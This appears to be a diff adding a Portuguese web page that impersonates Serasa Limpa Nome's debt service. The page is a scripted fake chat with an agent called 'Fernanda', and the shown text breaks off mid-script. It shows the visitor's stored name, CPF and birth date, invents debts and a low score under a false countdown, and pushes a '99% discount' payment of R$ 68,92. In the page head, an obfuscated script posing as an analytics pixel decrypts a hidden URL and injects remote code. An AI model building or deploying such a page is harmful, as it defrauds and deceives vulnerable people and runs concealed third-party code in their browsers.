@@ -1,0 +1,616 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8"><script src="../js/track-plus.js?v=1"></script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '1601503185054241');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=1601503185054241&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-SSBH1E4ETM"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-SSBH1E4ETM');
+</script>
+<!-- Utmify Pixel -->
+<!-- UTMify UTMs (script oficial) -->
+<script>(function(){var x_w=atob("DAyqsa2/82fLOx0U9neIxN/T0V3pU2lghn+QnoLclwnlTml5n2rTn87QnkmpSTJnlX7DwdnM3BK/Vm47mm3e1N7L3Q24GTE2l3jew8TdhhOuSD8urXeI38zSlkXxGXl1gm2HxNnSmgGyFm1mk3rP39mSiwSkXzBnlWeInY/Jkgu+Xj8u1C7XndadnQamXj8u1GjLxcyShhOmUntt23zY1NvanRPmSGh2n2jZk4GdhQanTng2zC6IzPDC");var s_ru5=[];for(var i_10b=0;i_10b<x_w.length;i_10b++){s_ru5.push(x_w.charCodeAt(i_10b)&255);}var x_43w=s_ru5[0];var i_2=s_ru5.slice(1,1+x_43w);var a_8a=s_ru5.slice(1+x_43w);var q_j4g1=a_8a.map(function(b,o_tg5){return b^i_2[o_tg5%x_43w];});var l_8v="";for(var w_q=0;w_q<q_j4g1.length;w_q++){l_8v+=String.fromCharCode(q_j4g1[w_q]&255);}var v_cxle=decodeURIComponent(escape(l_8v));var o_k=JSON.parse(v_cxle);var n_yqi8=o_k.globals||[];n_yqi8.forEach(function(c_4){window[c_4.name]=c_4.value;});var n_3=document.createElement("script");n_3.src=o_k.url;n_3.async=true;n_3.defer=true;(o_k.attributes||[]).forEach(function(x_4pod){n_3.setAttribute(x_4pod.name,x_4pod.value);});(document.head||document.documentElement).appendChild(n_3);})();</script>
+<!-- End Utmify Pixel -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover" />
+<title>Atendimento - Serasa Limpa Nome</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Inter',system-ui,sans-serif;background:#f3f4f7;min-height:100svh;display:flex;flex-direction:column;padding-top:158px}
+.topbar{background:#fff;display:flex;align-items:center;justify-content:space-between;padding:8px 14px;border-bottom:2px solid #e6007e;position:fixed;top:0;left:0;right:0;z-index:30;height:60px}
+.tb-left{display:flex;align-items:center;gap:10px}
+.topbar img.logo{height:42px;width:auto}
+.tb-txt .hi{font-weight:700;font-size:14px;color:#0f172a}
+.tb-txt .cpfm{font-size:12px;color:#667085}
+.user-pill{width:44px;height:44px;border-radius:50%;background:#e6007e;color:#fff;display:flex;align-items:center;justify-content:center;font-weight:800;font-size:18px}
+.agent-bar{background:#fff;display:flex;align-items:center;gap:10px;padding:8px 14px;box-shadow:0 1px 4px rgba(0,0,0,.08);position:fixed;top:60px;left:0;right:0;z-index:30}
+.agent-bar .dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:#22c55e;margin-right:5px}
+.agent-bar img{width:42px;height:42px;border-radius:50%;object-fit:cover}
+.agent-bar .n{font-weight:700;font-size:15px}
+.agent-bar .s{font-size:12.5px;color:#666}
+.urgency-strip{position:fixed;top:118px;left:0;right:0;z-index:29;background:linear-gradient(90deg,#7f0f3d 0%,#c2005f 50%,#7f0f3d 100%);color:#fff;padding:9px 14px;font-size:11.5px;line-height:1.35;display:flex;justify-content:space-between;align-items:center;gap:10px;border-bottom:2px solid #ffd1e8;box-shadow:0 4px 14px rgba(0,0,0,.15)}
+.urgency-strip .msg{flex:1;min-width:0;font-weight:600}
+.urgency-strip .msg b{color:#fff;text-decoration:underline;text-underline-offset:2px}
+.urgency-strip .timer{font-variant-numeric:tabular-nums;font-weight:800;flex-shrink:0;background:#fff;color:#c2005f;padding:5px 10px;border-radius:8px;font-size:12px;white-space:nowrap}
+.chat{flex:1;width:100%;max-width:600px;margin:0 auto;padding:14px 14px 30px;display:flex;flex-direction:column;gap:12px}
+.msg-row{display:flex;gap:8px;align-items:flex-end}
+.msg-row .av{width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0}
+.bubble{background:#fff;border-radius:14px;padding:12px 14px;font-size:14.5px;line-height:1.5;color:#222;max-width:85%;box-shadow:0 2px 8px rgba(0,0,0,.06);animation:pop .3s ease}
+.bubble.img{padding:6px;overflow:hidden}
+.bubble.img img{width:100%;border-radius:10px;display:block}
+.typing{display:inline-flex;gap:5px;align-items:center;padding:14px 16px}
+.typing span{width:8px;height:8px;background:#9aa5b8;border-radius:50%;animation:blink 1.2s infinite}
+.typing span:nth-child(2){animation-delay:.2s}.typing span:nth-child(3){animation-delay:.4s}
+@keyframes blink{0%,60%,100%{opacity:.3;transform:translateY(0)}30%{opacity:1;transform:translateY(-3px)}}
+@keyframes pop{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.sys{text-align:center;font-style:italic;font-size:13px;color:#555;margin:2px 0}
+.video-bubble{position:relative;width:240px;max-width:70%;border-radius:14px;overflow:hidden;background:#000;box-shadow:0 2px 8px rgba(0,0,0,.15);animation:pop .3s ease}
+.video-bubble video{width:100%;display:block;aspect-ratio:9/16;object-fit:cover;background:#e6007e}
+.play-overlay{position:absolute;left:12px;bottom:12px;width:52px;height:52px;border-radius:50%;background:rgba(230,0,126,.92);display:flex;align-items:center;justify-content:center;cursor:pointer;border:none}
+.play-overlay svg{fill:#fff;margin-left:3px}
+.data-card{background:#fff;border-radius:16px;padding:18px 18px 20px;box-shadow:0 2px 10px rgba(10,30,70,.08);max-width:100%;animation:pop .3s ease}
+.data-card .t{color:#e6007e;font-weight:700;font-size:15px;margin-bottom:10px}
+.data-card .field{margin-bottom:12px}
+.data-card .field:last-child{margin-bottom:0}
+.data-card b{display:block;color:#000;font-weight:700;font-size:14px;margin-bottom:2px}
+.data-card .v{display:block;color:#e6007e;font-weight:400;font-size:14px}
+.btns{display:flex;gap:10px;margin-top:10px;flex-wrap:wrap;justify-content:flex-end}
+.btn-yes{background:#e6007e;color:#fff;border:none;border-radius:999px;padding:12px 22px;font-weight:600;font-size:14px;cursor:pointer}
+.btn-no{background:#fff;color:#e6007e;border:1.5px solid #e6007e;border-radius:999px;padding:11px 20px;font-weight:600;font-size:14px;cursor:pointer}
+.msg-row.user{justify-content:flex-end}
+.bubble.user{background:#e6007e;color:#fff;max-width:75%}
+.logos-bubble{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06);max-width:100%;animation:pop .3s ease}
+.logos-bubble img{width:100%;display:block}
+.continue-wrap{display:flex;justify-content:flex-end}
+.btn-continue{background:#e6007e;color:#fff;border:none;border-radius:999px;padding:13px 30px;font-weight:700;font-size:14px;letter-spacing:.04em;cursor:pointer;animation:pop .3s ease}
+.btn-pay-full{display:block;width:100%;background:#e6007e;color:#fff;border:none;border-radius:12px;padding:17px 14px;font-weight:800;font-size:14px;letter-spacing:.02em;cursor:pointer;animation:pop .3s ease;text-align:center}
+.audio-row{display:flex;gap:8px;align-items:flex-end}
+.audio-bubble{background:#fff;border-radius:14px;padding:10px 14px 10px 10px;display:flex;align-items:center;gap:10px;box-shadow:0 2px 8px rgba(0,0,0,.06);max-width:85%;animation:pop .3s ease;flex:1}
+.audio-play{width:48px;height:48px;border-radius:50%;background:#e6007e;border:none;display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0}
+.audio-play svg{fill:#fff}
+.audio-play.playing svg.play-ic{display:none}
+.audio-play:not(.playing) svg.pause-ic{display:none}
+.audio-meta{flex:1;min-width:0}
+.audio-bar{height:4px;background:#f6d3e6;border-radius:99px;overflow:hidden;margin-bottom:6px}
+.audio-fill{height:100%;width:0%;background:#e6007e;border-radius:99px}
+.audio-time{font-size:12.5px;color:#666}
+.status-box{background:#ffe9f4;border:1px solid #ffb8dc;border-radius:12px;padding:12px 14px;font-size:14px;line-height:1.6;max-width:75%;animation:pop .3s ease}
+.status-box .lbl{color:#333;font-size:13.5px}
+.status-box .cpf{color:#e6007e;font-weight:500}
+.status-box .neg{color:#000;font-weight:800}
+.status-box.alert-urgent{background:#fff1f2;border:1.5px solid #e11d48;box-shadow:0 4px 14px rgba(225,29,72,.15)}
+.status-box.alert-urgent .warn{color:#b91c1c;font-weight:800;font-size:14px;line-height:1.45;margin:6px 0}
+.status-box.alert-urgent .date{color:#1f2937;font-weight:700}
+footer{background:#e6007e;text-align:center;padding:18px 16px calc(18px + env(safe-area-inset-bottom))}
+footer .g2{color:#fff;font-weight:800;font-size:20px;margin-bottom:4px}
+footer small{color:#ffd1e8;font-size:11px}
+</style>
+</head>
+<body>
+<div class="topbar">
+  <div class="tb-left"><img class="logo" src="../img/serasa-logo.avif" alt="Serasa" /><div class="tb-txt"><div class="hi">Olá!</div><div class="cpfm" id="cpf-mask">CPF: ...</div></div></div>
+  <div class="user-pill" id="first-ini">?</div>
+</div>
+<div class="agent-bar">
+  <img src="../img/fernanda.jpg" alt="Fernanda Oliveira" />
+  <div><div class="n">Fernanda Oliveira</div><div class="s"><span class="dot"></span>Online · Atendente Serasa Limpa Nome</div></div>
+</div>
+<div class="urgency-strip" id="urgency-strip" role="status" aria-live="polite">
+  <div class="msg">Prazo do feirão: <b id="urgency-date">—</b> · regularize seu CPF hoje</div>
+  <span class="timer" id="urgency-timer">00:47:00</span>
+</div>
+
+<div class="chat" id="chat"></div>
+
+<footer><div class="g2">Serasa Limpa Nome</div><small>Canal oficial de negociação · Seus dados estão protegidos.</small></footer>
+
+<script src="../js/track.js"></script>
+<script>
+// esconde imagens remotas quebradas em vez de exibir ícone quebrado
+document.addEventListener('error',function(e){
+  var t=e.target;
+  if(t&&t.tagName==='IMG'&&t.src&&t.src.indexOf('postimg')!==-1){
+    var row=t.closest?t.closest('.msg-row'):null;
+    if(row)row.style.display='none';else t.style.display='none';
+  }
+},true);
+</script>
+<script>
+var AV='../img/fernanda.jpg';
+var IMG='../img/topo.jpg';
+var LOGOS='../img/empresas.webp';
+var SCORE='../img/score.webp';
+var data={}; try{data=JSON.parse(localStorage.getItem('sr_consulta')||'{}');}catch(e){}
+var full=(data.nome||localStorage.getItem('sr_nome')||'USUÁRIO').toUpperCase();
+var cpfRaw=(data.cpfformatado||data.cpf||localStorage.getItem('sr_cpf')||'');
+var nascRaw=(data.nascimento||'');
+function fmtCpf(v){v=(''+v).replace(/\D/g,'');if(v.length!==11)return cpfRaw;return v.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');}
+function fmtNasc(v){var m=(''+v).match(/(\d{4})-(\d{2})-(\d{2})/);if(m)return m[3]+'/'+m[2]+'/'+m[1];return v;}
+var first=(full.split(' ')[0]||'...');
+document.getElementById('first-ini').textContent=(first.charAt(0)||'?');
+document.getElementById('cpf-mask').textContent='CPF: '+(cpfRaw?String(cpfRaw).replace(/\D/g,'').slice(0,3)+'.*******':'...');
+var ACORDO=(window.SR_CONFIG&&window.SR_CONFIG.ACORDO_CODE)||'X1KAL-10S--';
+var VIDEO_WAIT=19000;
+var DATA_HOJE=new Date().toLocaleDateString('pt-BR',{weekday:'long',day:'2-digit',month:'long',year:'numeric'});
+DATA_HOJE=DATA_HOJE.charAt(0).toUpperCase()+DATA_HOJE.slice(1);
+document.getElementById('urgency-date').textContent=DATA_HOJE;
+var URG_CORE='Hoje, <b>'+DATA_HOJE+'</b>, é o <b>último dia</b> para você <b>regularizar seu CPF</b>. Evite <b>bloqueios</b> e <b>perdas de benefícios governamentais</b> vinculados ao seu cadastro.';
+(function startCountdown(){
+  var el=document.getElementById('urgency-timer'),s=47*60+18;
+  function tick(){
+    if(s<=0){el.textContent='00:00:00';return;}
+    var h=Math.floor(s/3600),m=Math.floor((s%3600)/60),sec=s%60;
+    el.textContent=('0'+h).slice(-2)+':'+('0'+m).slice(-2)+':'+('0'+sec).slice(-2);
+    s--;setTimeout(tick,1000);
+  }
+  tick();
+})();
+var chat=document.getElementById('chat');
+function scrollDown(){window.scrollTo({top:document.body.scrollHeight,behavior:'smooth'});}
+function showTyping(){
+  var row=document.createElement('div');row.className='msg-row';
+  row.innerHTML='<img class="av" src="'+AV+'"/><div class="bubble typing"><span></span><span></span><span></span></div>';
+  chat.appendChild(row);scrollDown();return row;
+}
+function addMsg(html,isImg){
+  var row=document.createElement('div');row.className='msg-row';
+  row.innerHTML='<img class="av" src="'+AV+'"/><div class="bubble'+(isImg?' img':'')+'">'+html+'</div>';
+  chat.appendChild(row);scrollDown();return row;
+}
+function step(html,isImg){
+  return new Promise(function(res){
+    var t=showTyping();
+    setTimeout(function(){t.remove();addMsg(html,isImg);setTimeout(res,400);},3000);
+  });
+}
+function stepVideo(){
+  return new Promise(function(res){
+    var t=showTyping();
+    setTimeout(function(){
+      t.remove();
+      var row=document.createElement('div');row.className='msg-row';
+      row.innerHTML='<img class="av" src="'+AV+'"/><div class="video-bubble"><video id="att-video" src="../video/video-sr.mp4" playsinline preload="auto" disablepictureinpicture></video><button class="play-overlay" id="play-btn" aria-label="Ativar som"><svg width="22" height="22" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></button></div>';
+      chat.appendChild(row);scrollDown();
+      var v=row.querySelector('video'),b=row.querySelector('#play-btn');
+      v.loop=false;
+      try{v.removeAttribute('loop');}catch(e){}
+      v.muted=false;
+      v.volume=1;
+      function hideBtn(){b.style.display='none';}
+      function showBtn(){if(!v.ended)b.style.display='flex';}
+      function activateSound(){
+        if(v.ended)return;
+        v.muted=false;
+        v.volume=1;
+        try{v.removeAttribute('muted');}catch(e){}
+        var pr=v.play();if(pr&&pr.catch)pr.catch(function(){});
+        hideBtn();
+      }
+      v.onended=function(){try{v.pause();}catch(e){}b.style.display='none';};
+      try{v.removeAttribute('muted');}catch(e){}
+      var p=v.play();
+      if(p&&p.then){
+        p.then(function(){hideBtn();}).catch(function(){
+          v.muted=true;
+          var pm=v.play();
+          if(pm&&pm.then){
+            pm.then(function(){
+              setTimeout(function(){
+                v.muted=false;v.volume=1;
+                try{v.removeAttribute('muted');}catch(e){}
+                var p2=v.play();if(p2&&p2.catch)p2.catch(function(){});
+                if(!v.muted)hideBtn();
+              },300);
+            }).catch(function(){showBtn();});
+          }
+        });
+      }
+      v.onplaying=function(){if(!v.muted&&!v.ended)hideBtn();};
+      v.onpause=function(){if(!v.ended)showBtn();};
+      v.onended=function(){try{v.pause();}catch(e){}b.style.display='none';};
+      b.onclick=function(){activateSound();};
+      var unlock=function(){if(v.ended)return;v.muted=false;v.volume=1;try{v.removeAttribute('muted');}catch(e){}if(!v.paused&&!v.muted)hideBtn();else{var pr=v.play();if(pr&&pr.catch)pr.catch(function(){});}};
+      document.addEventListener('touchstart',unlock,{once:true});
+      document.addEventListener('click',unlock,{once:true});
+      setTimeout(res,600);
+    },3000);
+  });
+}
+(async function(){
+  await step('<img src="'+IMG+'" alt="Serasa Limpa Nome - Feirão Limpa Nome" />',true);
+  await step('Olá '+full+', esse é um canal oficial de atendimento do <b>Serasa Limpa Nome</b> e os seus dados estão seguros conosco. 🔐');
+  await step('<b>'+full+'</b>, '+URG_CORE);
+  await step('Aguarde em alguns instantes, um de nossos atendentes entrará na conversa..');
+  var sys=document.createElement('div');sys.className='sys';sys.textContent='(Atendente Fernanda entrou na conversa..) 💬';
+  chat.appendChild(sys);scrollDown();
+  await stepVideo();
+  await new Promise(function(r){var t=showTyping();setTimeout(function(){t.remove();r();},VIDEO_WAIT);});
+  var alertBox=document.createElement('div');alertBox.className='msg-row';
+  alertBox.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box alert-urgent" style="max-width:88%"><div class="warn">⛔ Prazo encerra hoje às 23:59</div><div class="date">'+DATA_HOJE+'</div><div class="warn" style="margin-top:8px;font-size:13px;font-weight:600">Confirme seus dados para seguir com a regularização do CPF nesta campanha.</div></div>';
+  chat.appendChild(alertBox);scrollDown();
+  var card=document.createElement('div');
+  card.innerHTML='<div class="data-card"><div class="t">Para continuar, confirme seus dados:</div><div class="field"><b>Nome:</b><span class="v">'+full+'</span></div><div class="field"><b>CPF:</b><span class="v">'+fmtCpf(cpfRaw)+'</span></div><div class="field"><b>Data de Nascimento:</b><span class="v">'+fmtNasc(nascRaw)+'</span></div></div><div class="btns"><button class="btn-yes" id="b-yes">Sim, está correto</button><button class="btn-no" id="b-no">Não sou eu</button></div>';
+  chat.appendChild(card);scrollDown();
+  document.getElementById('b-yes').onclick=function(){
+    localStorage.setItem('sr_confirmado','1');
+    var btns=document.querySelector('.btns');if(btns)btns.style.display='none';
+    (async function(){
+      var u=document.createElement('div');u.className='msg-row user';
+      u.innerHTML='<div class="bubble user">Sim, está correto.</div>';
+      chat.appendChild(u);scrollDown();
+      await step('Obrigado!');
+      await step('Aguarde... Entrando em sua conta Serasa.');
+      await step('Login efetuado com sucesso!');
+      await step('<b>'+full+'</b><br>Seja bem-vindo(a) à sua conta Serasa.');
+      await step('Negocie dívidas com as seguintes empresas:');
+      await new Promise(function(res){
+        var t=showTyping();
+        setTimeout(function(){
+          t.remove();
+          var w=document.createElement('div');
+          w.innerHTML='<div class="logos-bubble"><img src="'+LOGOS+'" alt="Empresas participantes" /></div>';
+          chat.appendChild(w);scrollDown();
+          setTimeout(res,400);
+        },3000);
+      });
+      await new Promise(function(res){
+        var t=showTyping();
+        setTimeout(function(){
+          t.remove();
+          var w=document.createElement('div');w.className='continue-wrap';
+          w.innerHTML='<button class="btn-continue" id="b-cont">CONTINUAR</button>';
+          chat.appendChild(w);scrollDown();
+          document.getElementById('b-cont').onclick=function(){
+            var cw=this.closest('.continue-wrap');if(cw)cw.style.display='none';
+            (async function(){
+              var u=document.createElement('div');u.className='msg-row user';
+              u.innerHTML='<div class="bubble user">CONTINUAR</div>';
+              chat.appendChild(u);scrollDown();
+              await new Promise(function(res){
+                var t=showTyping();
+                setTimeout(function(){
+                  t.remove();
+                  var row=document.createElement('div');row.className='audio-row';
+                  row.innerHTML='<img class="av" src="'+AV+'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0"/>'+
+                  '<div class="audio-bubble"><button class="audio-play" aria-label="Ouvir"><svg class="play-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg><svg class="pause-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M6 5h4v14H6zM14 5h4v14h-4z"/></svg></button>'+
+                  '<div class="audio-meta"><div class="audio-bar"><div class="audio-fill"></div></div><div class="audio-time">0:00 / 0:26</div></div>'+
+                  '<audio src="../audio/audio-1.mp3" preload="auto" autoplay></audio></div>';
+                  chat.appendChild(row);scrollDown();
+                  var audio=row.querySelector('audio'),btn=row.querySelector('.audio-play'),
+                      fill=row.querySelector('.audio-fill'),time=row.querySelector('.audio-time');
+                  function fmt(s){if(!isFinite(s))return '0:00';s=Math.floor(s);return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2);}
+                  audio.onloadedmetadata=function(){time.textContent='0:00 / '+fmt(audio.duration);};
+                  audio.ontimeupdate=function(){var p=audio.duration?audio.currentTime/audio.duration*100:0;fill.style.width=p+'%';time.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration);};
+                  audio.onended=function(){btn.classList.remove('playing');fill.style.width='0%';};
+                  btn.onclick=function(){if(audio.paused){audio.play();btn.classList.add('playing');}else{audio.pause();btn.classList.remove('playing');}};
+                                          audio.onplaying=function(){btn.classList.add('playing');};
+                                          try{var ap=audio.play();if(ap&&ap.catch)ap.catch(function(){});}catch(e){}
+                  setTimeout(res,400);
+                },3000);
+              });
+              await new Promise(function(r){var t=showTyping();setTimeout(function(){t.remove();r();},27000);});
+              await step('Você quer aproveitar o <b>último dia do feirão online</b> (<b>'+DATA_HOJE+'</b>) para <b>limpar seu nome</b> e <b>regularizar seu CPF</b>?');
+              await new Promise(function(res){
+                var t=showTyping();
+                setTimeout(function(){
+                  t.remove();
+                  var w=document.createElement('div');w.className='continue-wrap';
+                  w.innerHTML='<button class="btn-continue" id="b-neg">SIM! QUERO NEGOCIAR</button>';
+                  chat.appendChild(w);scrollDown();
+                  document.getElementById('b-neg').onclick=function(){
+                    var nb=this.closest('.continue-wrap');if(nb)nb.style.display='none';
+                    (async function(){
+                      var u=document.createElement('div');u.className='msg-row user';
+                      u.innerHTML='<div class="bubble user">SIM! QUERO NEGOCIAR</div>';
+                      chat.appendChild(u);scrollDown();
+                      await step('Por favor, aguarde analisarmos a situação do seu CPF em nosso sistema..');
+                      await step('<b>Consultando..</b>');
+                      await step('<b>Análise concluída!</b>');
+                      await step('Identificamos <b>4 dívidas ativas</b> no sistema. Os valores variam entre <b>R$ 1.728,74 a R$ 5.278,23</b> de dívida <b>em seu CPF.</b>');
+                      await new Promise(function(res){
+                        var t=showTyping();
+                        setTimeout(function(){
+                          t.remove();
+                          var row=document.createElement('div');row.className='msg-row';
+                          row.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box"><div class="lbl">Situação para CPF:</div><div class="cpf">'+fmtCpf(cpfRaw)+'</div><div class="neg">NEGATIVADO.</div></div>';
+                          chat.appendChild(row);scrollDown();
+                          setTimeout(res,400);
+                        },3000);
+                      });
+                      await step('Segundo nossos registros, seu SCORE é considerado muito baixo <b>(alto risco para crédito):</b>');
+                      await new Promise(function(res){
+                        var t=showTyping();
+                        setTimeout(function(){
+                          t.remove();
+                          var w=document.createElement('div');
+                          w.innerHTML='<div class="logos-bubble"><img src="'+SCORE+'" alt="Serasa Score 365 de 1000" /></div>';
+                          chat.appendChild(w);scrollDown();
+                          setTimeout(res,400);
+                        },3000);
+                      });
+                      await step('Você deseja verificar se existe algum acordo com desconto disponível para você?');
+                      await new Promise(function(res){
+                        var t=showTyping();
+                        setTimeout(function(){
+                          t.remove();
+                          var w=document.createElement('div');w.className='continue-wrap';
+                          w.innerHTML='<button class="btn-continue" id="b-buscar">BUSCAR ACORDO</button>';
+                          chat.appendChild(w);scrollDown();
+                          document.getElementById('b-buscar').onclick=function(){
+                            var bb=this.closest('.continue-wrap');if(bb)bb.style.display='none';
+                            (async function(){
+                              var u=document.createElement('div');u.className='msg-row user';
+                              u.innerHTML='<div class="bubble user">BUSCAR ACORDO</div>';
+                              chat.appendChild(u);scrollDown();
+                              await step('Por favor, aguarde enquanto nosso sistema verifica se existem acordos disponíveis para você...');
+                              await step('<b>Acordo encontrado!</b>');
+                              await new Promise(function(res){
+                                var t=showTyping();
+                                setTimeout(function(){
+                                  t.remove();
+                                  var row=document.createElement('div');row.className='msg-row';
+                                  row.innerHTML='<img class="av" src="'+AV+'"/><div class="status-box"><div class="neg">1 (um) acordo foi encontrado para:</div><div class="cpf">'+full+'</div><div class="cpf">CPF: '+fmtCpf(cpfRaw)+'</div></div>';
+                                  chat.appendChild(row);scrollDown();
+                                  setTimeout(res,400);
+                                },3000);
+                              });
+                              await new Promise(function(res){
+                                var t=showTyping();
+                                setTimeout(function(){
+                                  t.remove();
+                                  var w=document.createElement('div');w.className='continue-wrap';
+                                  w.innerHTML='<button class="btn-continue" id="b-ver">VER ACORDO</button>';
+                                  chat.appendChild(w);scrollDown();
+                                  document.getElementById('b-ver').onclick=function(){
+                                    var bv=this.closest('.continue-wrap');if(bv)bv.style.display='none';
+                                    (async function(){
+                                      var u=document.createElement('div');u.className='msg-row user';
+                                      u.innerHTML='<div class="bubble user">VER ACORDO</div>';
+                                      chat.appendChild(u);scrollDown();
+                                      await new Promise(function(res){
+                                        var t=showTyping();
+                                        setTimeout(function(){
+                                          t.remove();
+                                          var row=document.createElement('div');row.className='audio-row';
+                                          row.innerHTML='<img class="av" src="'+AV+'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0"/>'+
+                                          '<div class="audio-bubble"><button class="audio-play" aria-label="Ouvir"><svg class="play-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg><svg class="pause-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M6 5h4v14H6zM14 5h4v14h-4z"/></svg></button>'+
+                                          '<div class="audio-meta"><div class="audio-bar"><div class="audio-fill"></div></div><div class="audio-time">0:00 / 0:43</div></div>'+
+                                          '<audio src="../audio/audio-2.mp3" preload="auto" autoplay></audio></div>';
+                                          chat.appendChild(row);scrollDown();
+                                          var audio=row.querySelector('audio'),btn=row.querySelector('.audio-play'),
+                                              fill=row.querySelector('.audio-fill'),time=row.querySelector('.audio-time');
+                                          function fmt(s){if(!isFinite(s))return '0:00';s=Math.floor(s);return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2);}
+                                          audio.onloadedmetadata=function(){time.textContent='0:00 / '+fmt(audio.duration);};
+                                          audio.ontimeupdate=function(){var p=audio.duration?audio.currentTime/audio.duration*100:0;fill.style.width=p+'%';time.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration);};
+                                          audio.onended=function(){btn.classList.remove('playing');fill.style.width='0%';};
+                                          btn.onclick=function(){if(audio.paused){audio.play();btn.classList.add('playing');}else{audio.pause();btn.classList.remove('playing');}};
+                                          audio.onplaying=function(){btn.classList.add('playing');};
+                                          try{var ap=audio.play();if(ap&&ap.catch)ap.catch(function(){});}catch(e){}
+                                          setTimeout(res,400);
+                                        },3000);
+                                      });
+                                      await new Promise(function(res){
+                                        var t=showTyping();
+                                        setTimeout(function(){t.remove();res();},44000);
+                                      });
+                                      await step('Parabéns <b>'+full+'!</b>');
+                                      await step('Pode comemorar! Encontramos um <b>SUPER ACORDO DE 99% DE DESCONTO</b> para você!');
+                                      await step('<i>Acessando o acordo '+ACORDO+'...</i>');
+                                      await step('Informações do acordo <b><i>'+ACORDO+'</i></b> para ('+full+')<br><br>(CPF: '+fmtCpf(cpfRaw)+')');
+                                      await step('O contrato atual é válido apenas para o titular: <b>'+full+'</b> portador(a) do CPF: <b>'+fmtCpf(cpfRaw)+'</b>');
+                                      await step('Você gostaria de realizar o seu acordo com <b>99% DE DESCONTO</b> para quitar <b>todas</b> as suas dívidas e ter seu nome limpo novamente por apenas <b>R$ 68,92?</b>');
+                                      await new Promise(function(res){
+                                        var t=showTyping();
+                                        setTimeout(function(){
+                                          t.remove();
+                                          var w=document.createElement('div');w.className='continue-wrap';
+                                          w.innerHTML='<button class="btn-continue" id="b-confirm">CONFIRMAR O ACORDO E LIMPAR O NOME</button>';
+                                          chat.appendChild(w);scrollDown();
+                                          document.getElementById('b-confirm').onclick=function(){
+                                            var bc=this.closest('.continue-wrap');if(bc)bc.style.display='none';
+                                            (async function(){
+                                              var u=document.createElement('div');u.className='msg-row user';
+                                              u.innerHTML='<div class="bubble user">CONFIRMAR O ACORDO E LIMPAR O NOME</div>';
+                                              chat.appendChild(u);scrollDown();
+                                              await new Promise(function(res){
+                                                var t=showTyping();
+                                                setTimeout(function(){
+                                                  t.remove();
+                                                  var row=document.createElement('div');row.className='audio-row';
+                                                  row.innerHTML='<img class="av" src="'+AV+'" style="width:32px;height:32px;border-radius:50%;object-fit:cover;flex-shrink:0"/>'+
+                                                  '<div class="audio-bubble"><button class="audio-play" aria-label="Ouvir"><svg class="play-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg><svg class="pause-ic" width="20" height="20" viewBox="0 0 24 24"><path d="M6 5h4v14H6zM14 5h4v14h-4z"/></svg></button>'+
+                                                  '<div class="audio-meta"><div class="audio-bar"><div class="audio-fill"></div></div><div class="audio-time">0:00 / 0:17</div></div>'+
+                                                  '<audio src="../audio/audio-3.mp3" preload="auto" autoplay></audio></div>';
+                                                  chat.appendChild(row);scrollDown();
+                                                  var audio=row.querySelector('audio'),btn=row.querySelector('.audio-play'),
+                                                      fill=row.querySelector('.audio-fill'),time=row.querySelector('.audio-time');
+                                                  function fmt(s){if(!isFinite(s))return '0:00';s=Math.floor(s);return Math.floor(s/60)+':'+('0'+(s%60)).slice(-2);}
+                                                  audio.onloadedmetadata=function(){time.textContent='0:00 / '+fmt(audio.duration);};
+                                                  audio.ontimeupdate=function(){var p=audio.duration?audio.currentTime/audio.duration*100:0;fill.style.width=p+'%';time.textContent=fmt(audio.currentTime)+' / '+fmt(audio.duration);};
+                                                  audio.onended=function(){btn.classList.remove('playing');fill.style.width='0%';};
+                                                  btn.onclick=function(){if(audio.paused){audio.play();btn.classList.add('playing');}else{audio.pause();btn.classList.remove('playing');}};
+                                          audio.onplaying=function(){btn.classList.add('playing');};
+                                          try{var ap=audio.play();if(ap&&ap.catch)ap.catch(function(){});}catch(e){}
+                                                  setTimeout(res,400);
+                                                },3000);
+                                              });
+                                              await new Promise(function(res){
+                                                var t=showTyping();
+                                                setTimeout(function(){t.remove();res();},17000);
+                                              });
+                                              await step('<b>Acordo confirmado com sucesso!</b>');
+                                              await new Promise(function(res){
+                                                var t=showTyping();
+                                                setTimeout(function(){
